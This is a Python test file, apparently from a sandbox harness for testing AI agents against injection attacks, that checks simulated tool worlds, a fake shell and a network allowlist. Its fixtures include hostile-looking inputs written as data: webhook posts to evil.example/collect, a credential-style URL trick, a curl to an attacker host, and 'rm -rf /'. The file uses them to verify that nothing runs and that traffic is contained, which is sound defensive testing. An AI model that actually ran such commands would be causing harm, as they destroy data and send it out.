"""F03 world, executor and attacker link."""

from __future__ import annotations

import gc
import statistics
import time

import httpx
import pytest
import respx

from quarantix.packs.attacker import AttackerLink, host_port
from quarantix.packs.executor import ToolError
from quarantix.packs.model import Domain
from quarantix.packs.world import World

ATTACKER_HOSTS = ("attacker:9000", "localhost:9000")


def linked(domain: Domain, client: httpx.AsyncClient) -> World:
    link = AttackerLink(
        ATTACKER_HOSTS,
        email_domains=("attacker.test",),
        deliver_to="http://localhost:9000",
        client=client,
    )
    return domain.world(link)


async def test_clone_isolation(support: Domain) -> None:
    template = support.world()
    a, b = template.clone(), template.clone()
    a.plant("tickets", "new", "text", "hello", new_id="T-900", defaults={"customer_id": "C-1"})
    await a.registry.get("issue_refund").fn(order_number="ORD-1001", amount=120.0)  # type: ignore[misc]
    assert a.ledgers["refunds"] == [{"order_number": "ORD-1001", "amount": 120.0}]
    assert b.ledgers["refunds"] == [] and template.ledgers["refunds"] == []
    assert "T-900" in a.ids("tickets")
    assert "T-900" not in b.ids("tickets") and "T-900" not in template.ids("tickets")


def test_plant_appends_to_an_existing_record_and_never_parses_the_payload(support: Domain) -> None:
    world = support.world()
    payload = 'key: [value] {"json": true} --- &anchor *alias'
    world.plant("tickets", "T-101", "text", payload)
    text = world.get("tickets", "T-101")["text"]  # type: ignore[index]
    assert text.startswith("My order ORD-1001") and text.endswith(payload)
    assert support.seed.records["tickets"]["T-101"]["text"].endswith("please.")  # seed untouched


def test_plant_into_a_missing_record_creates_it_with_the_target_defaults(support: Domain) -> None:
    world = support.world()
    rid = world.plant(
        "tickets", "T-555", "text", "hi", defaults={"customer_id": "C-3", "status": "new"}
    )
    assert rid == "T-555"
    assert world.get("tickets", "T-555") == {
        "id": "T-555",
        "customer_id": "C-3",
        "status": "new",
        "text": "hi",
    }
    again = world.plant("tickets", "new", "text", "two", new_id="T-555")
    assert again == "T-555-2"  # never overwrites an existing id


async def test_list_records_filters_and_orders(support: Domain, devops: Domain) -> None:
    world = support.world()
    new = await world.registry.get("list_tickets").fn(status="new")  # type: ignore[misc]
    assert [t["id"] for t in new] == ["T-101", "T-102", "T-103", "T-104", "T-105", "T-106", "T-107"]
    ops = devops.world()
    alerts = await ops.registry.get("list_alerts").fn()  # type: ignore[misc]
    assert alerts[0]["id"] == "A-5"  # newest first
    logs = await ops.registry.get("read_logs").fn(service="api", lines=5)  # type: ignore[misc]
    assert len(logs) == 5 and all(row["service"] == "api" for row in logs)
    assert logs[-1]["id"] == "L-200"


async def test_owner_check(support: Domain) -> None:
    get_order = support.world().registry.get("get_order").fn
    assert get_order is not None
    order = await get_order(order_number="ORD-1001", customer_id="C-1")
    assert order["amount"] == 120.0
    with pytest.raises(ToolError, match="record not owned by this owner"):
        await get_order(order_number="ORD-1001", customer_id="C-2")
    with pytest.raises(ToolError, match="no record"):
        await get_order(order_number="ORD-9999", customer_id="C-1")


async def test_tools_reject_unknown_and_missing_arguments(support: Domain) -> None:
    refund = support.world().registry.get("issue_refund").fn
    assert refund is not None
    with pytest.raises(ToolError, match="unknown argument"):
        await refund(order_number="ORD-1001", amount=1, note="x")
    with pytest.raises(ToolError, match="missing argument"):
        await refund(order_number="ORD-1001")


@respx.mock
async def test_network_allowlist_only_the_attacker_host_is_contacted(support: Domain) -> None:
    attacker = respx.post("http://localhost:9000/hook").mock(return_value=httpx.Response(200))
    evil = respx.route(host="evil.example").mock(return_value=httpx.Response(200))
    async with httpx.AsyncClient() as client:
        world = linked(support, client)
        webhook = world.registry.get("send_webhook").fn
        assert webhook is not None
        await webhook(url="https://evil.example/collect", body="x")
        await webhook(url="http://attacker:9000@evil.example/collect", body="userinfo trick")
        await webhook(url="http://attacker:9000/hook", body="amount=4999")
    assert not evil.called
    assert attacker.call_count == 1
    assert len(world.ledgers["outbox"]) == 3  # everything is recorded
    assert [h.path for h in world.attacker_hits] == ["/hook"]
    assert world.attacker_hits[0].delivered


@respx.mock
async def test_fake_shell_runs_nothing_and_reaches_only_the_attacker(devops: Domain) -> None:
    attacker = respx.get(url__startswith="http://localhost:9000/").mock(
        return_value=httpx.Response(200)
    )
    other = respx.route(host="files.example.org").mock(return_value=httpx.Response(200))
    async with httpx.AsyncClient() as client:
        world = linked(devops, client)
        shell = world.registry.get("run_shell").fn
        assert shell is not None
        out = await shell(
            command="curl https://files.example.org/x && curl http://attacker:9000/k?v=1"
        )
        await shell(command="rm -rf / ; echo done")
    assert out == "command finished (exit 0)"
    assert not other.called and attacker.call_count == 1
    assert [row["command"] for row in world.ledgers["shell"]][1] == "rm -rf / ; echo done"


async def test_an_unreachable_attacker_page_never_fails_the_tool(support: Domain) -> None:
    async with httpx.AsyncClient(transport=httpx.MockTransport(_refuse)) as client:
        world = linked(support, client)
        webhook = world.registry.get("send_webhook").fn
        assert webhook is not None
        assert await webhook(url="http://attacker:9000/hook", body="x") == "sent"
    assert world.attacker_hits[0].delivered is False


def _refuse(request: httpx.Request) -> httpx.Response:
    raise httpx.ConnectError("refused", request=request)


def test_host_port_parsing() -> None:
    assert host_port("http://attacker:9000/x") == "attacker:9000"
    assert host_port("https://Example.ORG/") == "example.org:443"
    assert host_port("http://attacker:9000@evil.example/") == "evil.example:80"
    assert host_port("ftp://attacker:9000/") is None
    assert host_port("not a url") is None


async def test_the_bound_registry_keeps_the_domain_registry_version(support: Domain) -> None:
    world = support.world()
    assert world.registry.version == support.registry.version
    assert support.registry.get("issue_refund").fn is None  # the domain registry is metadata only


@pytest.mark.perf
def test_perf_clone_under_1_ms(devops: Domain) -> None:
    template = devops.world()
    template.plant("logs", "new", "text", "x")
    gc.collect()
    timings = []
    for _ in range(200):
        start = time.perf_counter()
        template.clone()
        timings.append((time.perf_counter() - start) * 1000)
    median, worst = statistics.median(timings), max(timings)
    print(f"\nclone: median {median * 1000:.1f} us, max {worst * 1000:.1f} us")
    assert median < 1.0
